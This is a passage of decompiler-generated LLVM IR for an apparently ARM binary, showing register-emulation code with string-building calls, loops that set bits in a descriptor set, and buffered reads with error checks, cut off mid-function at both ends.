  store i32 %stack_var_-20860.0.ph, i32* %r3.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_19774.32 to i32), i32* %r1.global-to-local, align 4
  %v2_8a68 = add i32 %v2_8a5c, %stack_var_-20860.0.ph
  store i32 %v2_8a68, i32* @r0, align 4
  %v3_8a6c = inttoptr i32 %v2_8a68 to i8*
  %v4_8a6c = call i32 @function_1234c(i8* %v3_8a6c, i32 ptrtoint ([3 x i8]* @global_var_19774.32 to i32))
  store i32 %v4_8a6c, i32* %r0.global-to-local, align 4
  store i32 %v6_81f8, i32* %ip.global-to-local, align 4
  %v1_8a74 = load i32, i32* @sb, align 4
  %v3_8a74 = icmp uge i32 %v6_81f8, %v1_8a74
  store i1 %v3_8a74, i1* %cpsr_c.global-to-local, align 1
  %v9_8a74 = icmp eq i32 %v6_81f8, %v1_8a74
  store i1 %v9_8a74, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_8a74, label %dec_label_pc_8b4c, label %dec_label_pc_8a7c

dec_label_pc_8a7c:                                ; preds = %dec_label_pc_8884
  store i32 35, i32* %r0.global-to-local, align 4
  %v1_8a80 = call i32 @function_11a94(i32 35)
  store i32 %stack_var_-20860.0.ph, i32* %r0.global-to-local, align 4
  %v2_8a88 = call i32 @function_12324(i8* %v1_88b8)
  %v0_8a8c = load i32, i32* @sb, align 4
  store i32 %v0_8a8c, i32* %r1.global-to-local, align 4
  store i32 %v2_8a88, i32* @r4, align 4
  store i32 35, i32* %r0.global-to-local, align 4
  %v2_8a98 = inttoptr i32 %v0_8a8c to i32*
  %v3_8a98 = call i32 @function_119d0(i32 35, i32* %v2_8a98)
  store i32 %stack_var_-20860.0.ph, i32* @lr, align 4
  store i32 %v3_8a98, i32* %r1.global-to-local, align 4
  %v1_8aa4 = load i32, i32* @r4, align 4
  %v2_8aa4 = add i32 %v1_8aa4, %stack_var_-20860.0.ph
  store i32 %v2_8aa4, i32* @r0, align 4
  %v2_8aa8 = inttoptr i32 %v2_8aa4 to i8*
  %v3_8aa8 = call i32 @function_1234c(i8* %v2_8aa8, i32 %v3_8a98)
  store i32 35, i32* %r0.global-to-local, align 4
  %v1_8ab0 = call i32 @function_119f4(i32 35)
  store i32 %stack_var_-20860.0.ph, i32* %r0.global-to-local, align 4
  %v2_8ab8 = call i32 @function_12324(i8* %v1_88b8)
  %v2_8ac0 = add i32 %v2_8ab8, %stack_var_-20860.0.ph
  store i32 %v2_8ac0, i32* @r0, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_19774.32 to i32), i32* %r1.global-to-local, align 4
  %v3_8ac8 = inttoptr i32 %v2_8ac0 to i8*
  %v4_8ac8 = call i32 @function_1234c(i8* %v3_8ac8, i32 ptrtoint ([3 x i8]* @global_var_19774.32 to i32))
  store i32 %stack_var_-20860.0.ph, i32* %r0.global-to-local, align 4
  %v2_8ad0 = call i32 @function_12324(i8* %v1_88b8)
  %v0_8ad4 = load i32, i32* @sb, align 4
  store i32 %v0_8ad4, i32* %r1.global-to-local, align 4
  store i32 %v2_8ad0, i32* %r4.global-to-local, align 4
  store i32 40, i32* %r0.global-to-local, align 4
  %v2_8ae0 = inttoptr i32 %v0_8ad4 to i32*
  %v3_8ae0 = call i32 @function_119d0(i32 40, i32* %v2_8ae0)
  store i32 %stack_var_-20860.0.ph, i32* %r2.global-to-local, align 4
  store i32 %v3_8ae0, i32* %r1.global-to-local, align 4
  %v2_8aec = add i32 %v2_8ad0, %stack_var_-20860.0.ph
  store i32 %v2_8aec, i32* @r0, align 4
  %v2_8af0 = inttoptr i32 %v2_8aec to i8*
  %v3_8af0 = call i32 @function_1234c(i8* %v2_8af0, i32 %v3_8ae0)
  store i32 %stack_var_-20860.0.ph, i32* %r0.global-to-local, align 4
  %v2_8af8 = call i32 @function_12324(i8* %v1_88b8)
  store i32 %stack_var_-20860.0.ph, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_19778.26 to i32), i32* %r1.global-to-local, align 4
  %v2_8b04 = add i32 %v2_8af8, %stack_var_-20860.0.ph
  store i32 %v2_8b04, i32* @r0, align 4
  %v2_8b08 = inttoptr i32 %v2_8b04 to i8*
  %v3_8b08 = call i32 @function_1234c(i8* %v2_8b08, i32 ptrtoint (i32* @global_var_19778.26 to i32))
  store i32 %v6_81f8, i32* %r0.global-to-local, align 4
  %v2_8b10 = call i32 @function_12324(i8* %v1_8b10)
  store i32 %v2_8b10, i32* @r4, align 4
  store i32 %stack_var_-20860.0.ph, i32* %r0.global-to-local, align 4
  %v2_8b1c = call i32 @function_12324(i8* %v1_88b8)
  store i32 %stack_var_-20860.0.ph, i32* %ip.global-to-local, align 4
  store i32 10, i32* %r1.global-to-local, align 4
  %v2_8b28 = add i32 %v2_8b1c, %stack_var_-20860.0.ph
  store i32 %v2_8b28, i32* %r2.global-to-local, align 4
  %v0_8b2c = load i32, i32* @r4, align 4
  store i32 %v0_8b2c, i32* %r0.global-to-local, align 4
  %v3_8b30 = trunc i32 %v0_8b2c to i8
  %v4_8b30 = call i32 @function_12824(i8 %v3_8b30, i32 10, i32 %v2_8b28)
  store i32 %stack_var_-20860.0.ph, i32* %r0.global-to-local, align 4
  %v2_8b38 = call i32 @function_12324(i8* %v1_88b8)
  store i32 %stack_var_-20860.0.ph, i32* @lr, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_19774.32 to i32), i32* %r1.global-to-local, align 4
  %v2_8b44 = add i32 %v2_8b38, %stack_var_-20860.0.ph
  store i32 %v2_8b44, i32* @r0, align 4
  %v3_8b48 = inttoptr i32 %v2_8b44 to i8*
  %v4_8b48 = call i32 @function_1234c(i8* %v3_8b48, i32 ptrtoint ([3 x i8]* @global_var_19774.32 to i32))
  store i32 %v4_8b48, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_8b4c

dec_label_pc_8b4c:                                ; preds = %dec_label_pc_8884, %dec_label_pc_8a7c
  %v0_8b4c = load i32, i32* @r6, align 4
  %v1_8b4c = add i32 %v0_8b4c, 16
  %v2_8b4c = inttoptr i32 %v1_8b4c to i32*
  %v3_8b4c = load i32, i32* %v2_8b4c, align 4
  store i32 %v3_8b4c, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_8b50 = icmp eq i32 %v3_8b4c, 0
  store i1 %v2_8b50, i1* %cpsr_z.global-to-local, align 1
  %tmp165 = icmp slt i32 %v3_8b4c, 1
  br i1 %tmp165, label %dec_label_pc_8bf8, label %dec_label_pc_8b58

dec_label_pc_8b58:                                ; preds = %dec_label_pc_8b4c
  store i32 %stack_var_-20860.0.ph, i32* %r0.global-to-local, align 4
  %v2_8b5c = call i32 @function_12324(i8* %v1_88b8)
  %v2_8b64 = add i32 %v2_8b5c, %stack_var_-20860.0.ph
  store i32 %v2_8b64, i32* @r0, align 4
  store i32 ptrtoint ([9 x i8]* @global_var_19788.34 to i32), i32* %r1.global-to-local, align 4
  %v3_8b6c = inttoptr i32 %v2_8b64 to i8*
  %v4_8b6c = call i32 @function_1234c(i8* %v3_8b6c, i32 ptrtoint ([9 x i8]* @global_var_19788.34 to i32))
  store i32 %v4_8b6c, i32* %r0.global-to-local, align 4
  %v0_8b70 = load i32, i32* @r6, align 4
  %v1_8b70 = add i32 %v0_8b70, 16
  %v2_8b70 = inttoptr i32 %v1_8b70 to i32*
  %v3_8b70 = load i32, i32* %v2_8b70, align 4
  store i32 %v3_8b70, i32* %r3.global-to-local, align 4
  store i32 %v10_82f0, i32* %r2.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_8b78 = icmp eq i32 %v3_8b70, 0
  store i1 %v2_8b78, i1* %cpsr_z.global-to-local, align 1
  %v0_8b7c = load i32, i32* @sb, align 4
  store i32 %v0_8b7c, i32* %stack_var_-44, align 4
  %tmp166 = icmp slt i32 %v3_8b70, 1
  br i1 %tmp166, label %dec_label_pc_8be0, label %dec_label_pc_8b84

dec_label_pc_8b84:                                ; preds = %dec_label_pc_8b58, %dec_label_pc_8b84
  store i32 %stack_var_-20860.0.ph, i32* %r0.global-to-local, align 4
  %v2_8b88 = call i32 @function_12324(i8* %v1_88b8)
  store i32 %v10_82f0, i32* %r3.global-to-local, align 4
  %v3_8b90 = load i32, i32* %stack_var_-44, align 4
  store i32 %stack_var_-20860.0.ph, i32* %ip.global-to-local, align 4
  %v1_8b98 = and i32 %v3_8b90, 33554432
  %v2_8b98 = icmp ne i32 %v1_8b98, 0
  store i1 %v2_8b98, i1* %cpsr_c.global-to-local, align 1
  %v3_8b98 = mul i32 %v3_8b90, 128
  %v1_8b9c = add i32 %v3_8b98, 1472
  %v2_8ba0 = add i32 %v2_8b88, %stack_var_-20860.0.ph
  store i32 %v2_8ba0, i32* @r0, align 4
  %v0_8ba4 = load i32, i32* @r5, align 4
  %v2_8ba4 = add i32 %v1_8b9c, %v0_8ba4
  store i32 %v2_8ba4, i32* %r1.global-to-local, align 4
  %v2_8ba8 = inttoptr i32 %v2_8ba0 to i8*
  %v3_8ba8 = call i32 @function_1234c(i8* %v2_8ba8, i32 %v2_8ba4)
  store i32 %stack_var_-20860.0.ph, i32* %r0.global-to-local, align 4
  %v2_8bb0 = call i32 @function_12324(i8* %v1_88b8)
  store i32 %stack_var_-20860.0.ph, i32* @lr, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_19794.36 to i32), i32* %r1.global-to-local, align 4
  %v2_8bbc = add i32 %v2_8bb0, %stack_var_-20860.0.ph
  store i32 %v2_8bbc, i32* @r0, align 4
  %v3_8bc0 = inttoptr i32 %v2_8bbc to i8*
  %v4_8bc0 = call i32 @function_1234c(i8* %v3_8bc0, i32 ptrtoint ([3 x i8]* @global_var_19794.36 to i32))
  store i32 %v4_8bc0, i32* %r0.global-to-local, align 4
  store i32 %v10_82f0, i32* %r1.global-to-local, align 4
  %v3_8bc8 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_8bc8, i32* %r3.global-to-local, align 4
  %v0_8bcc = load i32, i32* @r6, align 4
  %v1_8bcc = add i32 %v0_8bcc, 16
  %v2_8bcc = inttoptr i32 %v1_8bcc to i32*
  %v3_8bcc = load i32, i32* %v2_8bcc, align 4
  store i32 %v3_8bcc, i32* %r2.global-to-local, align 4
  %v1_8bd0 = add i32 %v3_8bc8, 1
  store i32 %v1_8bd0, i32* %ip.global-to-local, align 4
  %v3_8bd4 = icmp uge i32 %v3_8bcc, %v1_8bd0
  store i1 %v3_8bd4, i1* %cpsr_c.global-to-local, align 1
  %v9_8bd4 = icmp eq i32 %v3_8bcc, %v1_8bd0
  store i1 %v9_8bd4, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_8bd0, i32* %stack_var_-44, align 4
  %v8_8bdc = icmp sgt i32 %v3_8bcc, %v1_8bd0
  br i1 %v8_8bdc, label %dec_label_pc_8b84, label %dec_label_pc_8be0

dec_label_pc_8be0:                                ; preds = %dec_label_pc_8b84, %dec_label_pc_8b58
  store i32 %stack_var_-20860.0.ph, i32* %r0.global-to-local, align 4
  %v2_8be4 = call i32 @function_12324(i8* %v1_88b8)
  store i32 %stack_var_-20860.0.ph, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_19774.32 to i32), i32* %r1.global-to-local, align 4
  %v2_8bf0 = add i32 %v2_8be4, %stack_var_-20860.0.ph
  store i32 %v2_8bf0, i32* @r0, align 4
  %v3_8bf4 = inttoptr i32 %v2_8bf0 to i8*
  %v4_8bf4 = call i32 @function_1234c(i8* %v3_8bf4, i32 ptrtoint ([3 x i8]* @global_var_19774.32 to i32))
  store i32 %v4_8bf4, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_8bf8

dec_label_pc_8bf8:                                ; preds = %dec_label_pc_8b4c, %dec_label_pc_8be0
  store i32 %stack_var_-20860.0.ph, i32* %r0.global-to-local, align 4
  %v2_8bfc = call i32 @function_12324(i8* %v1_88b8)
  store i32 %stack_var_-20860.0.ph, i32* %r3.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_19774.32 to i32), i32* %r1.global-to-local, align 4
  %v2_8c08 = add i32 %v2_8bfc, %stack_var_-20860.0.ph
  store i32 %v2_8c08, i32* @r0, align 4
  %v3_8c0c = inttoptr i32 %v2_8c08 to i8*
  %v4_8c0c = call i32 @function_1234c(i8* %v3_8c0c, i32 ptrtoint ([3 x i8]* @global_var_19774.32 to i32))
  store i32 %v4_8c0c, i32* %r0.global-to-local, align 4
  store i32 %v6_81f8, i32* %ip.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 %v2_8c14, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_8c14, label %dec_label_pc_8c34, label %dec_label_pc_8c1c

dec_label_pc_8c1c:                                ; preds = %dec_label_pc_8bf8
  store i32 %stack_var_-20860.0.ph, i32* %r0.global-to-local, align 4
  %v2_8c20 = call i32 @function_12324(i8* %v1_88b8)
  store i32 %stack_var_-20860.0.ph, i32* @lr, align 4
  store i32 %v6_81f8, i32* %r1.global-to-local, align 4
  %v2_8c2c = add i32 %v2_8c20, %stack_var_-20860.0.ph
  store i32 %v2_8c2c, i32* @r0, align 4
  %v2_8c30 = inttoptr i32 %v2_8c2c to i8*
  %v3_8c30 = call i32 @function_1234c(i8* %v2_8c30, i32 %v6_81f8)
  store i32 %v3_8c30, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_8c34

dec_label_pc_8c34:                                ; preds = %dec_label_pc_8bf8, %dec_label_pc_8c1c
  %v0_8c34 = load i32, i32* @r5, align 4
  %v1_8c34 = add i32 %v0_8c34, 1440
  store i32 %v1_8c34, i32* %r4.global-to-local, align 4
  %v0_8c38 = load i32, i32* @fp, align 4
  store i32 %v0_8c38, i32* %r0.global-to-local, align 4
  store i32 %v1_8c34, i32* %r1.global-to-local, align 4
  %v2_8c40 = inttoptr i32 %v0_8c38 to i8*
  %v3_8c40 = call i32 @function_12710(i8* %v2_8c40, i32 %v1_8c34)
  store i32 %v3_8c40, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_8c44 = icmp eq i32 %v3_8c40, 0
  store i1 %v2_8c44, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_8c44, label %dec_label_pc_9710, label %dec_label_pc_8c4c

dec_label_pc_8c4c:                                ; preds = %dec_label_pc_8c34, %dec_label_pc_9710
  store i32 %stack_var_-20860.0.ph, i32* %r0.global-to-local, align 4
  %v0_8c50 = load i32, i32* @r6, align 4
  %v1_8c50 = add i32 %v0_8c50, -1452
  %v2_8c50 = inttoptr i32 %v1_8c50 to i32*
  %v3_8c50 = load i32, i32* %v2_8c50, align 4
  store i32 %v3_8c50, i32* @r4, align 4
  %v2_8c54 = call i32 @function_12324(i8* %v1_88b8)
  store i32 %stack_var_-20860.0.ph, i32* @r1, align 4
  store i32 %v2_8c54, i32* @r2, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_8c64 = load i32, i32* @r4, align 4
  store i32 %v0_8c64, i32* @r0, align 4
  %v4_8c68 = call i32 @function_14a74(i32 %v0_8c64, i32 %stack_var_-20860.0.ph, i32 %v2_8c54, i32 16384)
  store i32 %v4_8c68, i32* %r0.global-to-local, align 4
  %v0_8c6c = load i32, i32* @r6, align 4
  %v1_8c6c = add i32 %v0_8c6c, -1452
  %v2_8c6c = inttoptr i32 %v1_8c6c to i32*
  %v3_8c6c = load i32, i32* %v2_8c6c, align 4
  store i32 %v3_8c6c, i32* %ip.global-to-local, align 4
  %v3_8c74 = udiv i32 %v3_8c6c, 32
  store i32 %v2_86d8, i32* %r1.global-to-local, align 4
  %v3_8c7c = mul nuw nsw i32 %v3_8c74, 4
  %v2_8c80 = add i32 %v3_8c7c, %v2_86d8
  store i32 %v2_8c80, i32* %r2.global-to-local, align 4
  %v1_8c84 = add i32 %v2_8c80, -164
  %v2_8c84 = inttoptr i32 %v1_8c84 to i32*
  %v3_8c84 = load i32, i32* %v2_8c84, align 4
  %v1_8c8c = urem i32 %v3_8c6c, 32
  store i32 %v1_8c8c, i32* %r0.global-to-local, align 4
  %v7_8c90 = shl i32 1, %v1_8c8c
  %v8_8c90 = or i32 %v3_8c84, %v7_8c90
  store i32 %v8_8c90, i32* %r1.global-to-local, align 4
  store i32 6, i32* %r3.global-to-local, align 4
  store i32 %v8_8c90, i32* %v2_8c84, align 4
  %v0_8c9c = load i32, i32* %r3.global-to-local, align 4
  %v1_8c9c = trunc i32 %v0_8c9c to i8
  %v2_8c9c = load i32, i32* @r6, align 4
  %v3_8c9c = add i32 %v2_8c9c, -1448
  %v4_8c9c = inttoptr i32 %v3_8c9c to i8*
  store i8 %v1_8c9c, i8* %v4_8c9c, align 1
  %v0_8ca0 = load i32, i32* %ip.global-to-local, align 4
  %v1_8ca0 = load i32, i32* @r8, align 4
  %v2_8ca0 = sub i32 %v0_8ca0, %v1_8ca0
  %v3_8ca0 = icmp uge i32 %v0_8ca0, %v1_8ca0
  store i1 %v3_8ca0, i1* %cpsr_c.global-to-local, align 1
  %v4_8ca0 = xor i32 %v1_8ca0, %v0_8ca0
  %v5_8ca0 = xor i32 %v2_8ca0, %v0_8ca0
  %v6_8ca0 = and i32 %v5_8ca0, %v4_8ca0
  %v7_8ca0 = icmp slt i32 %v6_8ca0, 0
  %v8_8ca0 = icmp slt i32 %v2_8ca0, 0
  %v9_8ca0 = icmp eq i32 %v0_8ca0, %v1_8ca0
  store i1 %v9_8ca0, i1* %cpsr_z.global-to-local, align 1
  store i32 %v2_84f8, i32* %r2.global-to-local, align 4
  %v3_8ca8 = xor i1 %v8_8ca0, %v7_8ca0
  %v4_8ca8 = or i1 %v9_8ca0, %v3_8ca8
  br i1 %v4_8ca8, label %bb168, label %bb167

bb167:                                            ; preds = %dec_label_pc_8c4c
  %v6_8ca8 = add i32 %v0_8ca0, 1
  store i32 %v6_8ca8, i32* @r8, align 4
  br label %bb168

bb168:                                            ; preds = %dec_label_pc_8c4c, %bb167
  %v1_8cac = load i32, i32* @r6, align 4
  %v2_8cac = add i32 %v1_8cac, -1440
  %v3_8cac = inttoptr i32 %v2_8cac to i32*
  store i32 %v2_84f8, i32* %v3_8cac, align 4
  br label %dec_label_pc_85bc

dec_label_pc_8cb4:                                ; preds = %dec_label_pc_8574
  %v1_8cb4 = add i32 %v3_8878, -1444
  %v2_8cb4 = inttoptr i32 %v1_8cb4 to i32*
  %v3_8cb4 = load i32, i32* %v2_8cb4, align 4
  store i32 %v2_84f8, i32* %r1.global-to-local, align 4
  %v2_8cbc = sub i32 %v2_84f8, %v3_8cb4
  store i32 %v2_8cbc, i32* %r3.global-to-local, align 4
  %v2_8cc0 = icmp ugt i32 %v2_8cbc, 29
  store i1 %v2_8cc0, i1* %cpsr_c.global-to-local, align 1
  %v7_8cc0 = icmp eq i32 %v2_8cbc, 30
  store i1 %v7_8cc0, i1* %cpsr_z.global-to-local, align 1
  %v2_8cc4 = xor i1 %v7_8cc0, true
  %v3_8cc4 = and i1 %v2_8cc0, %v2_8cc4
  br i1 %v3_8cc4, label %dec_label_pc_85a4, label %dec_label_pc_8cc8

dec_label_pc_8cc8:                                ; preds = %dec_label_pc_8cb4
  %v2_8cc8 = inttoptr i32 %v1_85e0 to i32*
  %v3_8cc8 = load i32, i32* %v2_8cc8, align 4
  store i32 %v3_8cc8, i32* %ip.global-to-local, align 4
  %v3_8cd0 = udiv i32 %v3_8cc8, 32
  store i1 false, i1* %cpsr_c.global-to-local, align 1
  %v3_8cd4 = mul nuw nsw i32 %v3_8cd0, 4
  store i32 %v3_8cd4, i32* %r2.global-to-local, align 4
  store i32 %v2_86d8, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_86e0

dec_label_pc_8ce4:                                ; preds = %dec_label_pc_87ac, %dec_label_pc_8d0c
  %v0_8ce4 = call i32 @function_12ecc()
  store i32 %v0_8ce4, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_8cec = inttoptr i32 %v0_8ce4 to i32*
  store i32 0, i32* %v2_8cec, align 4
  store i32 %v2_8278, i32* @r1, align 4
  %v0_8cf4 = load i32, i32* @sl, align 4
  %v1_8cf4 = add i32 %v0_8cf4, -1452
  %v2_8cf4 = inttoptr i32 %v1_8cf4 to i32*
  %v3_8cf4 = load i32, i32* %v2_8cf4, align 4
  store i32 %v3_8cf4, i32* @r0, align 4
  store i32 10240, i32* @r2, align 4
  %v0_8cfc = load i32, i32* %r3.global-to-local, align 4
  %v1_8cfc = add i32 %v0_8cfc, 16384
  store i32 %v1_8cfc, i32* %r3.global-to-local, align 4
  %v4_8d00 = call i32 @function_14a08(i32 %v3_8cf4, i32 %v2_8278, i32 10240, i32 %v1_8cfc)
  store i32 %v4_8d00, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_8d04 = icmp eq i32 %v4_8d00, 0
  store i1 %v2_8d04, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_8d04, label %dec_label_pc_9990, label %dec_label_pc_8d0c

dec_label_pc_8d0c:                                ; preds = %dec_label_pc_8ce4
  %v3_8d0c = icmp eq i32 %v4_8d00, -1
  store i1 %v3_8d0c, i1* %cpsr_c.global-to-local, align 1
  %v8_8d0c = icmp eq i32 %v4_8d00, -1
  store i1 %v8_8d0c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_8d0c, label %dec_label_pc_8d14, label %dec_label_pc_8ce4

dec_label_pc_8d14:                                ; preds = %dec_label_pc_8d0c, %dec_label_pc_9990
  %v0_8d14 = call i32 @function_12ecc()
  store i32 %v0_8d14, i32* %r0.global-to-local, align 4
  %v1_8d18 = inttoptr i32 %v0_8d14 to i32*
  %v2_8d18 = load i32, i32* %v1_8d18, align 4
  store i32 %v2_8d18, i32* %r3.global-to-local, align 4
  %v2_8d1c = icmp ugt i32 %v2_8d18, 10
  store i1 %v2_8d1c, i1* %cpsr_c.global-to-local, align 1
  %v7_8d1c = icmp eq i32 %v2_8d18, 11
  store i1 %v7_8d1c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_8d1c, label %dec_label_pc_8d34, label %dec_label_pc_8d24

dec_label_pc_8d24:                                ; preds = %dec_label_pc_8d14
  %v0_8d24 = call i32 @function_12ecc()
  store i32 %v0_8d24, i32* %r0.global-to-local, align 4
  %v1_8d28 = inttoptr i32 %v0_8d24 to i32*
  %v2_8d28 = load i32, i32* %v1_8d28, align 4
  store i32 %v2_8d28, i32* %r3.global-to-local, align 4
  %v2_8d2c = icmp ugt i32 %v2_8d28, 10
  store i1 %v2_8d2c, i1* %cpsr_c.global-to-local, align 1
  %v7_8d2c = icmp eq i32 %v2_8d28, 11
  store i1 %v7_8d2c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_8d2c, label %dec_label_pc_8d34, label %dec_label_pc_95bc

dec_label_pc_8d34:                                ; preds = %dec_label_pc_8d24, %dec_label_pc_8d14
  %v0_8d34 = load i32, i32* @sl, align 4
  %v1_8d34 = add i32 %v0_8d34, -1448
  %v2_8d34 = inttoptr i32 %v1_8d34 to i8*
  %v3_8d34 = load i8, i8* %v2_8d34, align 1
  %v4_8d34 = zext i8 %v3_8d34 to i32
  store i32 %v4_8d34, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_8d38 = icmp eq i8 %v3_8d34, 0
  store i1 %v2_8d38, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_8d38, label %dec_label_pc_87b4, label %dec_label_pc_8d40

dec_label_pc_8d40:                                ; preds = %dec_label_pc_9694, %dec_label_pc_9ae4, %dec_label_pc_9ac8, %dec_label_pc_96d4, %dec_label_pc_96a4, %dec_label_pc_8d34, %dec_label_pc_9b10, %dec_label_pc_96ec
  store i32 1, i32* %r3.global-to-local, align 4
  %v2_8d44 = load i32, i32* @sl, align 4
  %v3_8d44 = add i32 %v2_8d44, -1448
  %v4_8d44 = inttoptr i32 %v3_8d44 to i8*
  store i8 1, i8* %v4_8d44, align 1
  br label %dec_label_pc_87b4

dec_label_pc_8d4c:                                ; preds = %dec_label_pc_8584
  %v2_8d4c = inttoptr i32 %v1_85e0 to i32*
  %v3_8d4c = load i32, i32* %v2_8d4c, align 4
  store i32 %v3_8d4c, i32* %ip.global-to-local, align 4
  %v3_8d54 = udiv i32 %v3_8d4c, 32
  store i32 %v2_86d8, i32* %r3.global-to-local, align 4
  %v3_8d5c = mul nuw nsw i32 %v3_8d54, 4
  %v2_8d60 = add i32 %v3_8d5c, %v2_86d8
  store i32 %v2_8d60, i32* %r2.global-to-local, align 4
  %v1_8d64 = add i32 %v2_8d60, -164
  %v2_8d64 = inttoptr i32 %v1_8d64 to i32*
  %v3_8d64 = load i32, i32* %v2_8d64, align 4
  %v1_8d68 = urem i32 %v3_8d4c, 32
  store i32 %v1_8d68, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v7_8d70 = shl i32 1, %v1_8d68
  %v8_8d70 = or i32 %v3_8d64, %v7_8d70
  store i32 %v8_8d70, i32* %r1.global-to-local, align 4
  %v1_8d74 = load i32, i32* @r8, align 4
  %v2_8d74 = sub i32 %v3_8d4c, %v1_8d74
  %v3_8d74 = icmp uge i32 %v3_8d4c, %v1_8d74
  store i1 %v3_8d74, i1* %cpsr_c.global-to-local, align 1
  %v4_8d74 = xor i32 %v1_8d74, %v3_8d4c
  %v5_8d74 = xor i32 %v2_8d74, %v3_8d4c
  %v6_8d74 = and i32 %v5_8d74, %v4_8d74
  %v7_8d74 = icmp slt i32 %v6_8d74, 0
  %v8_8d74 = icmp slt i32 %v2_8d74, 0
  %v9_8d74 = icmp eq i32 %v3_8d4c, %v1_8d74
  store i1 %v9_8d74, i1* %cpsr_z.global-to-local, align 1
  store i32 %v8_8d70, i32* %v2_8d64, align 4
  %v3_8d7c = xor i1 %v8_8d74, %v7_8d74
  %v4_8d7c = or i1 %v9_8d74, %v3_8d7c
  br i1 %v4_8d7c, label %dec_label_pc_85bc, label %dec_label_pc_8d80

dec_label_pc_8d80:                                ; preds = %dec_label_pc_8d4c
  %v0_8d80 = load i32, i32* %ip.global-to-local, align 4
  %v1_8d80 = load i32, i32* %r3.global-to-local, align 4
  %v2_8d80 = add i32 %v1_8d80, %v0_8d80
  store i32 %v2_8d80, i32* @r8, align 4
  br label %dec_label_pc_8700

dec_label_pc_8d88:                                ; preds = %dec_label_pc_87a4
  %v1_8d88 = add i32 %v0_8798, 660
  %v2_8d88 = inttoptr i32 %v1_8d88 to i32*
  %v3_8d88 = load i32, i32* %v2_8d88, align 4
  store i32 %v3_8d88, i32* %r3.global-to-local, align 4
  %v0_8d8c = load i32, i32* @sb, align 4
  %v2_8d90 = icmp ugt i32 %v3_8d88, 1023
  store i1 %v2_8d90, i1* %cpsr_c.global-to-local, align 1
  %v7_8d90 = icmp eq i32 %v3_8d88, 1024
  store i1 %v7_8d90, i1* %cpsr_z.global-to-local, align 1
  %v1_8d94 = add i32 %v0_8d8c, 2116
  store i32 %v1_8d94, i32* @r7, align 4
  br i1 %v7_8d90, label %dec_label_pc_8e9c, label %dec_label_pc_8d9c

dec_label_pc_8d9c:                                ; preds = %dec_label_pc_8d88, %dec_label_pc_8e9c, %dec_label_pc_8e90
  %v0_8d9c = call i32 @function_12ecc()
  store i32 %v0_8d9c, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_8da4 = inttoptr i32 %v0_8d9c to i32*
  store i32 0, i32* %v2_8da4, align 4
  %v0_8da8 = load i32, i32* @sl, align 4
  %v1_8da8 = add i32 %v0_8da8, 660
  %v2_8da8 = inttoptr i32 %v1_8da8 to i32*
  %v3_8da8 = load i32, i32* %v2_8da8, align 4
  store i32 %v3_8da8, i32* %r1.global-to-local, align 4
  %v1_8dac = add i32 %v0_8da8, -1452
  %v2_8dac = inttoptr i32 %v1_8dac to i32*
  %v3_8dac = load i32, i32* %v2_8dac, align 4
  store i32 %v3_8dac, i32* @r0, align 4
  %v1_8db0 = sub i32 1024, %v3_8da8
  store i32 %v1_8db0, i32* @r2, align 4
  %v0_8db4 = load i32, i32* %r3.global-to-local, align 4
  %v1_8db4 = add i32 %v0_8db4, 16384
  store i32 %v1_8db4, i32* %r3.global-to-local, align 4
  %v0_8db8 = load i32, i32* @r7, align 4
  %v2_8db8 = add i32 %v0_8db8, %v3_8da8
  store i32 %v2_8db8, i32* @r1, align 4
  %v4_8dbc = call i32 @function_14a08(i32 %v3_8dac, i32 %v2_8db8, i32 %v1_8db0, i32 %v1_8db4)
  store i32 %v4_8dbc, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_8dc0 = icmp eq i32 %v4_8dbc, 0
  store i1 %v2_8dc0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_8dc0, label %dec_label_pc_9590, label %dec_label_pc_8dc8

dec_label_pc_8dc8:                                ; preds = %dec_label_pc_8d9c
  %v2_8dc8 = icmp eq i32 %v4_8dbc, -1
  store i1 %v2_8dc8, i1* %cpsr_c.global-to-local, align 1
  %v7_8dc8 = icmp eq i32 %v4_8dbc, -1
  store i1 %v7_8dc8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_8dc8, label %dec_label_pc_959c, label %dec_label_pc_8dd0

dec_label_pc_8dd0:                                ; preds = %dec_label_pc_8dc8
  %v0_8dd0 = load i32, i32* @sl, align 4
  %v1_8dd0 = add i32 %v0_8dd0, 660
  %v2_8dd0 = inttoptr i32 %v1_8dd0 to i32*
  %v3_8dd0 = load i32, i32* %v2_8dd0, align 4
  store i32 %v2_8764, i32* %r1.global-to-local, align 4
